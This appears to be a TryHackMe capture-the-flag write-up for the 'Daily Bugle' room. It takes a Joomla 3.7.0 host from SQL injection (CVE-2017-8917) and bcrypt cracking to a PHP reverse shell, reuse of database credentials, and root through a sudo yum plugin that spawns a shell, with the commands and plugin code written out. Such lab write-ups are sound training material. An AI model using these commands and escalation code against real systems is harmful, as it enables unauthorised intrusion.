# Daily Bugle — TryHackMe

<p align="center">
  <img src="https://img.shields.io/badge/Platform-TryHackMe-red?style=flat-square&logo=tryhackme" alt="Platform: TryHackMe">
  <img src="https://img.shields.io/badge/Difficulty-Hard-black?style=flat-square" alt="Difficulty: Hard">
  <img src="https://img.shields.io/badge/OS-CentOS-blue?style=flat-square" alt="Operating System: CentOS">
  <img src="https://img.shields.io/badge/Focus-Web%20%7C%20Linux%20Privesc-7f3fbf?style=flat-square" alt="Focus: Web and Linux Privilege Escalation">
</p>

> A penetration-testing walkthrough covering Joomla SQL injection, password cracking, reverse-shell execution, lateral movement, and Linux privilege escalation.

---

## Table of Contents

- [Target Information](#target-information)
- [01 · Reconnaissance](#01--reconnaissance)
- [02 · Web Enumeration](#02--web-enumeration)
- [03 · SQL Injection](#03--sql-injection)
- [04 · Password Cracking](#04--password-cracking)
- [05 · Initial Access](#05--initial-access)
- [06 · Lateral Movement](#06--lateral-movement)
- [07 · Privilege Escalation](#07--privilege-escalation)
- [08 · Attack Chain](#08--attack-chain)
- [09 · Key Takeaways](#09--key-takeaways)

---

## Target Information

| Property | Value |
|---|---|
| Platform | TryHackMe |
| Room | Daily Bugle |
| Difficulty | Hard |
| Target IP | `10.66.163.145` |
| Attacker IP | `192.168.131.226` |
| Operating System | CentOS |
| Web Server | Apache 2.4.6 |
| CMS | Joomla 3.7.0 |

---

## 01 · Reconnaissance

### Port Scanning

The initial scan identified three exposed services:

```bash
nmap -sV -sC 10.66.163.145
```

| Port | Service | Version |
|---:|---|---|
| 22 | SSH | OpenSSH 7.4 |
| 80 | HTTP | Apache 2.4.6 / PHP 5.6.40 |
| 3306 | MySQL | MariaDB 10.3.23 or earlier |

The HTTP service revealed a Joomla installation. The `robots.txt` file also disclosed several CMS-related paths.

### Preliminary Vulnerability Research

The outdated PHP version was identified as an additional area for investigation.

A PHP-to-shell technique was considered as an alternative route to initial access. However, it was not pursued because the objective was to investigate the target through its web application, obtain credentials, and progress through the privilege levels rather than take the shortest available path.

**Scope decision:** prioritize the Joomla vulnerability and investigate the subsequent attack chain. Potential vulnerabilities in other services were not treated as confirmed findings without sufficient evidence of applicability.

---

## 02 · Web Enumeration

### Directory Discovery

Gobuster was used to enumerate web directories and files:

```bash
gobuster dir \
  -u http://10.66.163.145/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,bak
```

Relevant findings:

| Path | Status | Significance |
|---|---:|---|
| `/README.txt` | 200 | CMS version identification |
| `/administrator/` | 301 | Joomla administration panel |
| `/templates/` | 301 | Template directory |
| `/configuration.php` | 200 | Configuration file path |
| `/robots.txt` | 200 | Additional paths |
| `/index.php` | 200 | Main application |

Additional directories included `/images/`, `/media/`, `/modules/`, `/plugins/`, `/components/`, `/libraries/`, `/includes/`, `/language/`, `/cache/`, `/tmp/`, `/layouts/`, `/bin/`, and `/cli/`.

### Joomla Version Identification

The `README.txt` file disclosed Joomla **3.7.0**. This version is affected by [CVE-2017-8917](https://nvd.nist.gov/vuln/detail/CVE-2017-8917), a SQL injection vulnerability in the `com_fields` component.

This became the primary entry point for the attack.

---

## 03 · SQL Injection

### Exploit

The following public proof of concept was used:

- **Exploit:** [Joomla 3.7.0 Exploit on GitHub](https://github.com/ztrxwzy/joomla.3.7.0exploit)
- **Credit:** `ztrxwz`

The exploit targets this endpoint:

```text
index.php?option=com_fields&view=fields&layout=modal
```

It manipulates the `list[fullordering]` parameter and uses error-based SQL injection to extract database information through functions such as `UpdateXML`.

### Execution

```bash
python3 exploit.py --host 10.66.163.145 --debug
```

### Database Enumeration

The exploit enumerated the columns of Joomla's `users` table:

```text
id, name, username, email, password, block,
sendEmail, registerDate, lastvisitDate, activation,
params, lastResetTime, resetCount, otpKey, otep,
requireReset
```

A privileged Joomla account was discovered:

| Field | Value |
|---|---|
| Username | `jonah` |
| Account role | Super User |
| Email | `jonah@tryhackme.com` |
| Password hash | `[REDACTED]` |

The original hash used bcrypt with a cost factor of 10, making password cracking the next step.

---

## 04 · Password Cracking

### John the Ripper

The first attempt used John the Ripper with the `rockyou.txt` wordlist:

```bash
john --format=bcrypt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  bcrypt.txt
```

### Hashcat

Hashcat was then used to attempt the same task:

```bash
hashcat -m 3200 bcrypt.txt \
  /usr/share/wordlists/rockyou.txt --force
```

After approximately 15 minutes on the available hardware, the password was recovered.

| Username | Password |
|---|---|
| `jonah` | `[REDACTED]` |

The recovered credentials provided access to the Joomla administrator panel.

---

## 05 · Initial Access

### Joomla Administrator Panel

The panel was accessible at [`http://10.66.163.145/administrator/`](http://10.66.163.145/administrator/).

After authentication, the template editor was used to create a PHP file named `test.php` under the `protostar` template directory.

The payload was based on the public reverse shell from [Pentestmonkey — PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell).

### Reverse Shell

A listener was started on the attacking machine:

```bash
nc -nlvp 4444
```

The PHP file was then accessed at [`http://10.66.163.145/templates/protostar/test.php`](http://10.66.163.145/templates/protostar/test.php).

A reverse shell was received successfully. The current user was verified:

```bash
whoami
```

```text
apache
```

**Initial access achieved:** `apache`

---

## 06 · Lateral Movement

### Configuration File Discovery

During local enumeration, the following configuration file was discovered:

```text
/var/www/html/configuration.php
```

Relevant configuration values included:

```php
public $user = 'root';
public $password = '[REDACTED]';
public $db = 'joomla';
public $dbprefix = 'fb9j5_';
public $live_site = '';
public $secret = '[REDACTED]';
```

The configuration exposed credentials that could potentially be reused for a local system account.

### Switching to `jjameson`

A local user named `jjameson` was identified. The database password was tested against this account:

```bash
su jjameson
```

The password was entered interactively and the switch succeeded. Identity verification:

```bash
id
```

```text
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
```

**Lateral movement achieved:** `apache` → `jjameson`

This step demonstrated the risk of password reuse between application configuration and system accounts.

---

## 07 · Privilege Escalation

### Sudo Enumeration

As `jjameson`, sudo permissions were enumerated:

```bash
sudo -l
```

Relevant output:

```text
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

The user could execute `yum` with elevated privileges without a password.

### GTFOBins

The [GTFOBins](https://gtfobins.github.io/) documentation provided a starting point for exploiting the permitted command. The original technique required adaptation for the target environment.

### Creating the Plugin Configuration

**1. Create a temporary directory**

```bash
TF=$(mktemp -d)
```

**2. Create the main configuration**

```bash
cat > "$TF/x" <<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
```

**3. Create the plugin configuration**

```bash
cat > "$TF/y.conf" <<EOF
[main]
enabled=1
EOF
```

**4. Create the Python plugin**

```python
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE

requires_api_version = '2.1'

def init_hook(conduit):
    os.execl('/bin/sh', '/bin/sh')
```

The code above was saved as `$TF/y.py`.

**5. Execute yum with the plugin enabled**

```bash
sudo yum -c "$TF/x" --enableplugin=y
```

The plugin executed `/bin/sh` with elevated privileges.

### Root Access

The resulting shell was verified using:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Privilege escalation successful — root access obtained.**

---

## 08 · Attack Chain

```text
Joomla 3.7.0 Discovery
        |
        v
CVE-2017-8917 — SQL Injection
        |
        v
Extract and crack password hash
        |
        v
Joomla Admin → Reverse shell (apache)
        |
        v
Credential reuse: apache → jjameson
        |
        v
sudo NOPASSWD: /usr/bin/yum
        |
        v
Root access
```

---

## 09 · Key Takeaways

| Finding | Security Impact |
|---|---|
| Outdated Joomla installation | SQL injection exposed database information |
| Weak administrator password | Enabled recovery of the privileged account password |
| Editable PHP templates | Allowed reverse-shell execution |
| Credential reuse | Enabled lateral movement to a local user |
| Unrestricted privileged `yum` execution | Enabled privilege escalation to root |

### Alternative Attack Path Considered

A PHP-to-shell technique was considered during preliminary research. It was not pursued because the objective was to explore the longer attack chain through SQL injection, credential recovery, initial access, lateral movement, and privilege escalation.

This decision allowed a more detailed investigation of the target instead of stopping at an earlier route to shell access.

### Challenges

- Initial SUID and process enumeration did not reveal a suitable privilege-escalation path.
- Downloading additional tools with `wget` was unsuccessful.
- The GTFOBins `yum` technique required adaptation before it worked.

### Conclusion

Daily Bugle demonstrated how a chain of weaknesses can lead from a publicly exposed web application to full system compromise.

The most important stages were identifying the vulnerable Joomla version, exploiting SQL injection, recovering the administrator's password, obtaining a reverse shell, reusing credentials for lateral movement, and abusing privileged `yum` execution.

The room reinforced the importance of systematic enumeration, evaluating alternative attack paths, and adapting known techniques to the target environment.

---

<p align="center">
  <sub>TryHackMe · Daily Bugle · Penetration Testing Write-up</sub>
</p>
